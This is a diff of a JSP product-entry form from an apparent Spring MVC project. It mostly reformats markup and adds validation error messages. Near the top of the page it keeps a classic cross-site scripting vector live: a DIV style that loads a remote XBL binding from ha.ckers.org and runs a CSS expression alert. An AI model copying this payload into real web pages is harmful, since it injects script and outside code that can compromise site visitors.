@@ -12,18 +12,19 @@ bootstrap.min.css">
 </head>
 <body>
 	<section>
-	<DIV STYLE='-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss");xss:expression(alert("XSS"))'>
-		<div class="jumbotron">
-			<div class="container">
-				<h1>Products</h1>
-				<p>Add products</p>
+		<DIV
+			STYLE='-moz-binding: url("http://ha.ckers.org/xssmoz.xml#xss"); xss: expression(alert("XSS"))'>
+			<div class="jumbotron">
+				<div class="container">
+					<h1>Products</h1>
+					<p>Add products</p>
+				</div>
+				<a href="<c:url value="/j_spring_security_logout" />"
+					class="btn btn-danger btn-mini pull-right">logout</a>
+				<div class="pull-right" style="padding-right: 50px">
+					<a href="?language=en">English</a>|<a href="?language=nl">Dutch</a>
+				</div>
 			</div>
-			<a href="<c:url value="/j_spring_security_logout" />"
-				class="btn btn-danger btn-mini pull-right">logout</a>
-			<div class="pull-right" style="padding-right: 50px">
-				<a href="?language=en">English</a>|<a href="?language=nl">Dutch</a>
-			</div>
-		</div>
 	</section>
 	<section class="container">
 		<form:form modelAttribute="newProduct" class="form-horizontal"
@@ -37,6 +38,27 @@ bootstrap.min.css">
 						<form:input id="productId" path="productId" type="text"
 							class="form:input-large" />
 					</div>
+					<form:errors path="productId" cssClass="text-danger" />
+				</div>
+
+				<div class="form-group">
+					<label class="control-label col-lg-2 col-lg-2" for="name"><spring:message
+							code="addProduct.form.name.label" /></label>
+					<div class="col-lg-10">
+						<form:input id="name" path="name" type="text"
+							class="form:input-large" />
+					</div>
+					<form:errors path="name" cssClass="text-danger" />
+				</div>
+
+				<div class="form-group">
+					<label class="control-label col-lg-2 col-lg-2" for="unitPrice"><spring:message
+							code="addProduct.form.unitPrice.label" /></label>
+					<div class="col-lg-10">
+						<form:input id="unitPrice" path="unitPrice" type="text"
+							class="form:input-large" />
+					</div>
+					<form:errors path="unitPrice" cssClass="text-danger" />
 				</div>
 
 				<div class="form-group">
@@ -84,6 +106,7 @@ bootstrap.min.css">
 					</div>
 				</div>
 			</fieldset>
+			<form:errors path="*" cssClass="alert alert-danger" element="div" />
 		</form:form>
 	</section>
 </body>
